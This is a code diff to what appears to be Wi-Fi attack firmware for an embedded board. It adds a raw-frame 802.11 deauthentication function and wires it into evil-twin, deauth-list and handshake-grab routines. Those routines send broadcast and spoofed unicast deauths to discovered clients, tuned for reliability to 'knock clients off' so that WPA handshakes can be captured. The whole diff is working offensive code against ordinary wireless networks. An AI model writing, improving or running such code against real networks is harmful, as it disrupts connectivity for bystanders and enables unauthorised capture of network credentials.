@@ -953,6 +953,26 @@ static void tx_beacon_raw(const uint8_t* src, const uint8_t* dst, const char* ss
   if(n > 0) wifi_tx_raw_frame(tx_stage, n);
 }
 
+// Hand-built deauth frame through the proven raw-TX path. The SDK's wifi_tx_deauth_frame() is the
+// same buggy custom-TX family as wifi_tx_beacon_frame() (see note above) -- during HSGRAB it
+// hard-faulted/rebooted the board. wifi_tx_raw_frame() is the path auth/probe/beacon frames already
+// use successfully. Caller MUST have tuned the channel first (wifi_tx_raw_frame hangs otherwise --
+// see the note above). addr1=dst, addr2=src, addr3=bssid; FC=0xC0 deauth; 2-byte reason. The frame
+// array lives inside this called function on purpose (one in loop()'s own frame wedged the board --
+// see the tx_stage note).
+static void tx_deauth_raw(const uint8_t* dst, const uint8_t* src, const uint8_t* bssid, uint16_t reason) {
+  uint8_t f[26];
+  int n = 0;
+  f[n++] = 0xC0; f[n++] = 0x00;                 // frame control: deauthentication
+  f[n++] = 0x00; f[n++] = 0x00;                 // duration
+  memcpy(f + n, dst, 6);   n += 6;              // addr1 = destination
+  memcpy(f + n, src, 6);   n += 6;              // addr2 = source
+  memcpy(f + n, bssid, 6); n += 6;              // addr3 = BSSID
+  f[n++] = 0x00; f[n++] = 0x00;                 // sequence (driver fills)
+  f[n++] = (uint8_t)(reason & 0xFF); f[n++] = (uint8_t)((reason >> 8) & 0xFF);
+  wifi_tx_raw_frame(f, n);                       // n == 26
+}
+
 // --- B1: KARMA / known-beacon responder ---------------------------------------
 // Sniff probe requests (promiscuous) and answer every requested SSID with a probe response to the
 // requesting client plus a broadcast beacon, both cloning that SSID. The BSSID is derived from the
@@ -2163,7 +2183,7 @@ static void eviltwinTick() {
     if (et_live && !is_dfs_channel(et_ch)) {        // AP is down here: burst-deauth the real AP
       wext_set_channel(WLAN0_NAME, et_ch);
       for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
-        wifi_tx_deauth_frame(et_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 6);
+        tx_deauth_raw(TX_BCAST, et_bssid, et_bssid, 6);   // raw path, not the buggy SDK call
         delay(5);
       }
     }
@@ -2219,7 +2239,7 @@ static void deauthListTick(bool apOwned) {
   if (!apOwned) wext_set_channel(WLAN0_NAME, ch);
   led_w(LED_R, HIGH);
   for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
-    wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
+    tx_deauth_raw(TX_BCAST, deauth_bssid, deauth_bssid, deauth_reason);   // raw path, not the buggy SDK call
     delay(5);
   }
   led_w(LED_R, LOW);
@@ -4615,6 +4635,9 @@ void loop() {
   if (hsg_phase == HSG_DISCOVER) {
     if (millis() - hsg_t >= hsg_disc_ms) {
       wifi_set_promisc(0, NULL, 0);
+      wext_set_channel(WLAN0_NAME, hsg_ch);   // tune ONCE for the deauth phase; the burst below no
+                                              // longer re-tunes every loop pass (that flooded the
+                                              // radio with hundreds of re-tunes -> board reboot)
       hsg_phase = HSG_DEAUTH;
       hsg_t = millis();
       if (hsg_dry) {   // M2 dry-run: announce the target instead of transmitting
@@ -4626,19 +4649,25 @@ void loop() {
       }
     }
   } else if (hsg_phase == HSG_DEAUTH) {
-    wext_set_channel(WLAN0_NAME, hsg_ch);
-    if (!hsg_dry && !is_dfs_channel(hsg_ch)) {   // DFS: RX-only; hsg_dry: skip all attack TX
+    // Rate-gate the burst: the old code re-tuned the channel AND re-sent 5 broadcast + up to 16
+    // unicast deauths on EVERY loop() pass for hsg_deauth_ms (4 s) -> thousands of frames and
+    // hundreds of wext_set_channel calls, which hard-faulted/rebooted the board (passive CAPTURE,
+    // which tunes once, is stable). Channel is tuned once on phase entry now; fire ~10 bursts/s,
+    // plenty to knock clients off. Frames go through tx_deauth_raw (raw path) not the buggy SDK call.
+    static uint32_t last_deauth = 0;
+    if (!hsg_dry && !is_dfs_channel(hsg_ch) && (uint32_t)(millis() - last_deauth) >= 100u) {
+      last_deauth = millis();
       for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
-        wifi_tx_deauth_frame(hsg_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 6);
-        delay(5);
+        tx_deauth_raw(TX_BCAST, hsg_bssid, hsg_bssid, 6);   // AP -> broadcast
+        delay(2);
       }
       // Unicast both directions to each discovered STA — broadcast deauth is often ignored.
       uint8_t sn = STA_LOAD();
       for (uint8_t k = 0; k < sn && k < 8; k++) {
-        wifi_tx_deauth_frame(hsg_bssid, (void *)sta_list[k].mac, 6);   // AP -> STA
-        delay(5);
-        wifi_tx_deauth_frame((void *)sta_list[k].mac, hsg_bssid, 6);   // STA -> AP
-        delay(5);
+        tx_deauth_raw(sta_list[k].mac, hsg_bssid, hsg_bssid, 6);   // AP -> STA
+        delay(2);
+        tx_deauth_raw(hsg_bssid, sta_list[k].mac, hsg_bssid, 6);   // STA -> AP (spoofed)
+        delay(2);
       }
     }
     if (millis() - hsg_t >= hsg_deauth_ms) {
@@ -4647,7 +4676,7 @@ void loop() {
       hsg_phase = HSG_CAPTURE;
       hsg_t = millis();
     } else {
-      delay(50);
+      delay(20);
     }
   } else if (hsg_phase == HSG_CAPTURE) {
     if (millis() - hsg_t >= hsg_cap_ms) {
